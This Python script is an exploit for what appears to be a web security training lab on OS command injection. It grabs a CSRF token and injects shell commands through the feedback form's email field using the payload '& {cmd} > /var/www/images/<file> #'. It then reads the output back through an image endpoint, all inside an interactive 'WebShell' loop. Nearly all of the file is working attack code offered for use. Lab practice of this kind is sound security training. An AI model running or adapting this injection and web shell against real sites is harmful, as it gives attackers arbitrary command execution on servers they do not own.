#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import string
import random
from datetime import timedelta
from timeit import default_timer as timer
import argparse  # cli interface
import logging
import requests
import urllib3
from bs4 import BeautifulSoup
import sys

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

__author__ = 'Emanuele Rossi'
__credits__ = ['cyb3rw0lf']
__appName__ = 'Program Name'
__license__ = 'MIT'
__version__ = '1.0.0-alpha'
__appVers__ = '%s v%s' % (__appName__, __version__)
__status__ = 'Test|Production'
__maintainer__ = 'cyb3rw0lf'
__homepage__ = 'https://github.com/cyb3rw0lf/'
__email__ = 'w0lf.code@pm.me'
__issues__ = 'https://github.com/cyb3rw0lf/repo_name/issues'
__usage__ = ('Perform OS Command Injection in Web Academy LAB #3')

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def rndString(length):
    # Generate a random string
    str = string.ascii_letters
    return ''.join(random.choice(str) for i in range(length))


def get_csrf_token(s, url):
    feedback_path = '/feedback'
    r = s.get(url + feedback_path, verify=False, proxies=proxies)
    soup = BeautifulSoup(r.text, 'html.parser')
    csrf = soup.find(attrs={'name': 'csrf'})['value']
    logging.debug(f'Found CSRF token: {csrf}')
    return csrf


def exploit_command_injection(s, url, payload, output_file):
    submit_feedback_path = '/feedback/submit'
    command_injection = 'test@test.com ' + payload
    logging.debug('Fetching CSRF Token')
    csrf_token = get_csrf_token(s, url)
    data = {'csrf': csrf_token, 'name': 'test', 'email': command_injection, 'subject': 'test', 'message': 'test'}
    logging.debug(f'Injecting command: {data}')
    res = s.post(url + submit_feedback_path, data=data, verify=False, proxies=proxies)

    # Check if it's possible to read the output.txt file created
    output_path = f'/image?filename={output_file}'
    res2 = s.get(url + output_path, verify=False, proxies=proxies)

    match res2.status_code:
        case 200:
            logging.debug('Exploit successful')
            return res2.text
        case _:
            logging.debug('Exploit failed, output file not found')
            return 'Error: Cannot exploit this URL, check parameters again'


def main():
    # START CLI UI
    parser = argparse.ArgumentParser(description=__usage__)
    parser.add_argument('-v', '--version', action='version', version=__appVers__)
    parser.add_argument('-u', type=str, help='Target URL', required=True, metavar='URL')
    parser.add_argument('-d', '--debug', help='enable logging debug', default=False, action="store_true")
    args = parser.parse_args()
    # END CLI UI
    # Logging to STDOUT
    logging.basicConfig(level=logging.DEBUG, format='%(asctime)s - %(levelname)s - %(message)s')
    if not args.debug:
        logging.disable(logging.DEBUG)
    logging.info('Session Started')

    url = args.u

    banner = '''################################
#          WebShell            #
################################'''

    print(banner)
    print(f'URL:: {url}\n')

    # Interactive loop
    while True:
        cmd = input('<CMD> ').strip()
        match cmd:
            case ('exit' | 'quit'):
                print('<CMD> Bye!')
                break
            case (''):
                continue
            case _:
                logging.debug(f'[Command]: {cmd}')
                output_file = rndString(10) + '.txt'
                payload = f'& {cmd} > /var/www/images/{output_file} #'
                logging.debug(f'Payload: {payload}')
                # Create a session to the target URL
                s = requests.Session()
                output = exploit_command_injection(s, url, payload, output_file)
                print(f'[Output]:\n{output}')

    logging.info('Session Finished')
    end_time = timer()
    logging.info(f'Duration: {(timedelta(seconds=end_time-start_time))}')


if __name__ == '__main__':
    start_time = timer()
    main()
